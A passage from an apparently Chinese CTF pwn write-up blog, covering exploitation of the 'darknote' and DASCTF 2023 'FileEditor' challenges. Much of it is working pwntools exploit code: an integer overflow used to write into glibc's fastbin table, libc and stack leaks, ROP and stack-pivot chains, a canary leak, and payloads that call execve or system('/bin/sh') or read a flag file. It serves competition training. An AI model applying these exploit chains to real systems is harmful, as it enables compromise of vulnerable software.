class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x0400772&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x0400768&#x27;)</span></span><br><span class="line">pop_rbp_ret=<span class="number">0x0400570</span></span><br><span class="line">pop_rdi=<span class="number">0x04007e3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x04007e1</span></span><br><span class="line">leave_ret=<span class="number">0x0400712</span></span><br><span class="line">bss_data=<span class="number">0x601020</span></span><br><span class="line">gadget=<span class="number">0x000000000040066b</span> <span class="comment">#0x000000000040066b: lea rdx, [rax + 0x601020]; mov rax, qword ptr [rbp - 8]; mov qword ptr [rdx], rax; nop; pop rbp; ret; </span></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">binsh=bss_data+<span class="number">100</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload=flat(padding,pop_rbp_ret,read_got+<span class="number">8</span>,gadget,<span class="number">0</span>)<span class="comment">#read函数地址写入bss段</span></span><br><span class="line">payload+=flat(pop_rdi,<span class="number">0</span>,pop_rsi_r15,bss_data,<span class="number">0</span>,read_plt)<span class="comment">#最后一位改为0x90</span></span><br><span class="line">payload+=flat(pop_rdi,<span class="number">0</span>,pop_rsi_r15,binsh,<span class="number">0</span>,read_plt)<span class="comment">#读入binsh同时设置系统调用号</span></span><br><span class="line">payload+=flat(pop_rdi,binsh,pop_rsi_r15,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">rop.migrate(bss_data)<span class="comment">#栈迁移到bss_data，rop</span></span><br><span class="line">payload+=rop.chain()</span><br><span class="line">s(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">s(<span class="string">b&#x27;\x90&#x27;</span>)<span class="comment">#改为0x90</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">s(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x3b</span>-<span class="number">8</span>))<span class="comment">#设置eax为execve调用号0x3b</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>这里最后时<code> syscall  &lt;SYS_execve&gt;</code>rsi参数需要为0，rdx不必需</p><p>除了栈迁移还可用csu里的gadget来执行到syscall</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004007C0 4C 89 EA                      mov     rdx, r13</span><br><span class="line">.text:00000000004007C3 4C 89 F6                      mov     rsi, r14</span><br><span class="line">.text:00000000004007C6 44 89 FF                      mov     edi, r15d</span><br><span class="line">.text:00000000004007C9 41 FF 14 DC                   call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:00000000004007C9</span><br><span class="line">.text:00000000004007CD 48 83 C3 01                   add     rbx, 1</span><br><span class="line">.text:00000000004007D1 48 39 EB                      cmp     rbx, rbp</span><br><span class="line">.text:00000000004007D4 75 EA                         jnz     short loc_4007C0</span><br><span class="line">.text:00000000004007D4</span><br><span class="line">.text:00000000004007D6</span><br><span class="line">.text:00000000004007D6                               loc_4007D6:                             ; CODE XREF: init+34↑j</span><br><span class="line">.text:00000000004007D6 48 83 C4 08                   add     rsp, 8</span><br><span class="line">.text:00000000004007DA 5B                            pop     rbx</span><br><span class="line">.text:00000000004007DB 5D                            pop     rbp</span><br><span class="line">.text:00000000004007DC 41 5C                         pop     r12</span><br><span class="line">.text:00000000004007DE 41 5D                         pop     r13</span><br><span class="line">.text:00000000004007E0 41 5E                         pop     r14</span><br><span class="line">.text:00000000004007E2 41 5F                         pop     r15</span><br><span class="line">.text:00000000004007E4 C3                            retn</span><br></pre></td></tr></table></figure><h3 id="darknote"><a href="#darknote" class="headerlink" title="darknote"></a>darknote</h3><p>只有add功能可以用，其他功能需要canary为0才可以，基本不可能</p><p>下面的函数存在整数溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;How many dark notes do you want?&quot;</span>);</span><br><span class="line">note_count = ((__int64 (__fastcall *)(<span class="type">const</span> <span class="type">char</span> *, <span class="type">char</span> **))read_num)(<span class="string">&quot;How many dark notes do you want?&quot;</span>, a2);</span><br><span class="line">note_ptr_ar = <span class="built_in">malloc</span>(<span class="number">8</span> * note_count);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">index_add = ((__int64 (__fastcall *)(<span class="type">const</span> <span class="type">char</span> *, _BYTE *))read_num)(<span class="string">&quot;Index: &quot;</span>, v3);</span><br><span class="line"><span class="keyword">if</span> ( index_add &gt;= <span class="number">0</span> &amp;&amp; index_add &lt; note_count )</span><br><span class="line">&#123;</span><br><span class="line">    v6 = (<span class="type">void</span> **)((<span class="type">char</span> *)note_ptr_ar + <span class="number">8</span> * index_add);</span><br><span class="line">    *v6 = <span class="built_in">malloc</span>(<span class="number">0x68</span>uLL);</span><br></pre></td></tr></table></figure><p>note_count*8后如果溢出，会导致申请的堆块小于<code> v6 = (void **)((char *)note_ptr_ar + 8 * index_add); *v6 = malloc(0x68uLL);</code>可写的堆块，所以我们利用mmap申请到libc上方的堆块，就可以往libc写我们申请的堆地址</p><p>思路</p><ul><li>把我们申请堆的地址写入到 main_arena.fastbin[5]的位置，我们就可以在申请堆伪造下一个堆，造成任意堆的申请</li><li>利用输出菜单函数泄露libc</li><li>利用存储着系统的环境变量的__environ泄露stack地址</li><li>在stack上布置rop链</li><li>malloc_hook改为触发rop链的gadget</li></ul><p>任意堆申请时要注意申请的任意堆的fd域即任意堆地址+0x10处要为0，不然过不了检测</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./darknote&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x401B7B&#x27;)#malloc</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x401AFF&#x27;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, note</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Note: &#x27;</span>, note)</span><br><span class="line"><span class="comment">#mmap 0x7f82cbc1c010</span></span><br><span class="line">sla(<span class="string">b&#x27;do you want?&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x40040000</span>))</span><br><span class="line"><span class="comment">#pwndbg&gt; p &amp;main_arena.fastbinsY[5]</span></span><br><span class="line"><span class="comment">#$1 = (mfastbinptr *) 0x7f82cc009bb8 &lt;main_arena+56&gt;</span></span><br><span class="line"><span class="comment">#distance 0x7f82cc009bb8  0x7f82cbc1c010</span></span><br><span class="line"><span class="comment">#0x7f82cc009bb8-&gt;0x7f82cbc1c010 is -0x3edba8 bytes (-0x7db75 words)</span></span><br><span class="line">fast_5=<span class="number">0x3edba8</span>&gt;&gt;<span class="number">3</span></span><br><span class="line">add(fast_5,flat(<span class="number">0</span>,<span class="number">0x71</span>,<span class="number">0x404260</span>-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,flat(<span class="number">0</span>,<span class="number">0</span>,elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">rl()</span><br><span class="line">puts_ad=uu64(r(<span class="number">6</span>))</span><br><span class="line">libcbase=puts_ad-libcelf.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line"></span><br><span class="line">environ = libcbase + libcelf.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">malloc_hook=libcbase+libcelf.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">syscall=libcbase+libcelf.symbols[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line">write=libcbase+libcelf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read=libcbase+libcelf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">add(fast_5,flat(<span class="number">0</span>,<span class="number">0x71</span>,<span class="number">0x404260</span>-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,flat(<span class="number">0</span>,<span class="number">0</span>,environ))</span><br><span class="line">rl()</span><br><span class="line">stack=uu64(r(<span class="number">6</span>))-<span class="number">0x98</span></span><br><span class="line">p(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line">pop_pop=<span class="number">0x0000000000401dbb</span></span><br><span class="line">ropstart=libcbase+<span class="number">0x00000000000ddc57</span></span><br><span class="line"><span class="comment"># 0x00000000000ddc57 : add rsp, 0xe0 ; pop rbx ; ret </span></span><br><span class="line">bss=<span class="number">0x404000</span></span><br><span class="line"></span><br><span class="line">add(fast_5,flat(<span class="number">0</span>,<span class="number">0x71</span>,stack-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401dc3</span></span><br><span class="line">pop_rsi_ret = libcbase + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx_ret = libcbase + <span class="number">0x0000000000142c92</span></span><br><span class="line">ropread=flat(<span class="number">0</span>,<span class="number">0</span>,pop_rdi_ret,<span class="number">0</span>,pop_rsi_ret,bss+<span class="number">0x100</span>,pop_rdx_ret,<span class="number">0x300</span>,elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop.migrate(bss+<span class="number">0x100</span>)</span><br><span class="line">ropread+=rop.chain()</span><br><span class="line">add(<span class="number">1</span>,ropread)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x401B7B&#x27;)#malloc</span></span><br><span class="line">add(fast_5,flat(<span class="number">0</span>,<span class="number">0x71</span>,malloc_hook-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,p64(ropstart))</span><br><span class="line">db(<span class="string">&#x27;b *__malloc_hook&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">flagstr=bss+<span class="number">0x100</span>+<span class="number">7</span>*<span class="number">8</span>*<span class="number">3</span></span><br><span class="line">orw=flat(pop_rdi_ret,<span class="number">2</span>,pop_rsi_ret,flagstr,pop_rdx_ret,<span class="number">0</span>,syscall)</span><br><span class="line">orw+=flat(pop_rdi_ret,<span class="number">3</span>,pop_rsi_ret,bss+<span class="number">200</span>,pop_rdx_ret,<span class="number">0x30</span>,read)</span><br><span class="line">orw+=flat(pop_rdi_ret,<span class="number">1</span>,pop_rsi_ret,bss+<span class="number">200</span>,pop_rdx_ret,<span class="number">0x30</span>,write)</span><br><span class="line">orw.ljust(<span class="number">7</span>*<span class="number">8</span>*<span class="number">3</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">orw+=<span class="string">b&#x27;flag\x00&#x27;</span></span><br><span class="line">pause()</span><br><span class="line">sl(orw)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF 2023 &amp; 0X401七月暑期挑战赛 pwn</title>
      <link href="/2023/07/24/2023-DASCTF-0X401/"/>
      <url>/2023/07/24/2023-DASCTF-0X401/</url>
      
        <content type="html"><![CDATA[<p>链接：<a href="https://pan.baidu.com/s/15LFJ4XykHz3bax3CAnJl3A">https://pan.baidu.com/s/15LFJ4XykHz3bax3CAnJl3A</a><br>提取码：hwg0</p><h2 id="FileEditor"><a href="#FileEditor" class="headerlink" title="FileEditor"></a>FileEditor</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">DWORD line_num</span><br><span class="line"><span class="type">char</span> <span class="built_in">string</span>[<span class="number">204</span>]</span><br><span class="line"><span class="type">void</span> *next_ptr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Find_String里会把原来的字符串先拷贝到栈，最后再拷贝回去，只要控制a2 + 104处为0，a2不为0就可以把栈上的值拷贝回到原来存储字符串的堆上，这里就完全符合canary最后一位为\x00的特性</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">vuln_copy</span><span class="params">(<span class="type">char</span> *a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(a2 + <span class="number">104</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strcpy</span>(a1, (<span class="type">const</span> <span class="type">char</span> *)a2);</span><br><span class="line">  result = (<span class="type">char</span> *)*(<span class="type">unsigned</span> __int8 *)(a2 + <span class="number">105</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !(_BYTE)result )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strcpy</span>(a1, (<span class="type">const</span> <span class="type">char</span> *)a2);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">179</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">char</span> *)*(<span class="type">unsigned</span> __int8 *)(i + a2);</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">0xFF</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    result = (<span class="type">char</span> *)*(<span class="type">unsigned</span> __int8 *)(i + a2);</span><br><span class="line">    a1[i] = (<span class="type">char</span>)result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Find_String时栈情况，可以用来泄露基地址</p><p><img src="/2023/07/24/2023-DASCTF-0X401/image-20230724230450343.png" alt="image-20230724230450343"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;28327&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Insert_Line</span>(<span class="params">line_num,line_count,content</span>):</span><br><span class="line">  sla(<span class="string">b&#x27;&gt; choose:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;r n m:&#x27;</span>,<span class="built_in">str</span>(line_num).encode())</span><br><span class="line">  sl(<span class="built_in">str</span>(line_count).encode())</span><br><span class="line">  sla(<span class="string">b&#x27;sequence:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Modify_Line</span>(<span class="params">line_num,content</span>):</span><br><span class="line">  sla(<span class="string">b&#x27;&gt; choose:&#x27;</span>,<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;be modified:&#x27;</span>,<span class="built_in">str</span>(line_num).encode())</span><br><span class="line">  sla(<span class="string">b&#x27; content:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findstring</span>(<span class="params">find_str</span>):</span><br><span class="line">  sla(<span class="string">b&#x27;&gt; choose:&#x27;</span>,<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;search for:&#x27;</span>,find_str)</span><br><span class="line">  sla(<span class="string">b&#x27;hing? (y/n)&#x27;</span>,<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">  sla(<span class="string">b&#x27;&gt; choose:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x2154)&#x27;)</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x001FA4)&#x27;)</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x02350)&#x27;)</span></span><br><span class="line">sla(<span class="string">b&#x27;&gt; choose:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">Insert_Line(<span class="number">1</span>,<span class="number">1</span>,<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>)</span><br><span class="line">findstring(<span class="string">b&#x27;abc&#x27;</span>)</span><br><span class="line">Modify_Line(<span class="number">1</span>,<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>)</span><br><span class="line">canary=uu64(r(<span class="number">8</span>))-<span class="number">0xa</span></span><br><span class="line">p(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line">Modify_Line(<span class="number">1</span>,<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;A&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">pie=uu64(r(<span class="number">6</span>))-(<span class="number">0x55555555552b</span>-<span class="number">0x555555554000</span>)</span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line"></span><br><span class="line">Modify_Line(<span class="number">1</span>,<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;A&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">heapbase=uu64(r(<span class="number">6</span>))-(<span class="number">0x55555555a2a0</span>-<span class="number">0x55555555a000</span>)</span><br><span class="line">p(<span class="string">&#x27;heapbase&#x27;</span>,heapbase)</span><br><span class="line"></span><br><span class="line">Modify_Line(<span class="number">1</span>,<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;A&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">libcbase=uu64(r(<span class="number">6</span>))-(<span class="number">0x7ffff7de5083</span>-<span class="number">0x7ffff7dc1000</span>)<span class="comment">#ubuntu20</span></span><br><span class="line"><span class="comment"># -(0x7ffff7c29d90-0x7ffff7c00000)#unbuntu22</span></span><br><span class="line">p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">system=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh=<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))+libcbase</span><br><span class="line">rdi=pie+<span class="number">0x2ac3</span></span><br><span class="line">ret=pie+<span class="number">0x101a</span></span><br><span class="line">rop=flat([canary,<span class="number">0</span>,rdi,binsh,ret,system])</span><br><span class="line"><span class="built_in">print</span>(rop)</span><br><span class="line"><span class="comment"># rop=p64(canary)+p64(0xdeadbeef)+p64(rdi)+p64(binsh)+p64(system)</span></span><br><span class="line"><span class="comment"># print(rop)</span></span><br><span class="line">Modify_Line(<span class="number">1</span>,<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>+rop)</span><br><span class="line">findstring(<span class="string">b&#x27;abc&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>另一个可以泄露的漏洞点在Replace_String函数里</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> v14[<span class="number">104</span>]; <span class="comment">// [rsp+130h] [rbp-70h] BYREF</span></span><br><span class="line"><span class="type">unsigned</span> __int64 v15; <span class="comment">// [rsp+198h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">v15 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">v4 = <span class="number">0</span>;</span><br><span class="line">v5 = <span class="number">1</span>;</span><br><span class="line">v7 = <span class="number">1</span>;</span><br><span class="line">v9 = a1;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&gt; Please enter the string to search for:&quot;</span>);</span><br><span class="line">read_string((__int64)s2, <span class="number">104</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&gt; Replace with:&quot;</span>);</span><br><span class="line">read_string((__int64)v14, <span class="number">104</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">read_string</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="type">int</span>)i &lt;= a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = read(<span class="number">0</span>, (<span class="type">void</span> *)((<span class="type">int</span>)i + a1), <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)((<span class="type">int</span>)i + a1) == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)((<span class="type">int</span>)i + a1) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>read_string实际上可以往里读105个数，来覆盖canary最后一位</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v11 = sub_55EAC947338F(s2, v14, v9-&gt;<span class="built_in">string</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(v9-&gt;<span class="built_in">string</span>, v11);</span><br></pre></td></tr></table></figure><p>可以把canary保存到存储字符串去来泄露</p><p>最后在利用下面的read_string里的&#x2F;n会被置零，来恢复canary</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&gt; Do you want to change your strings? 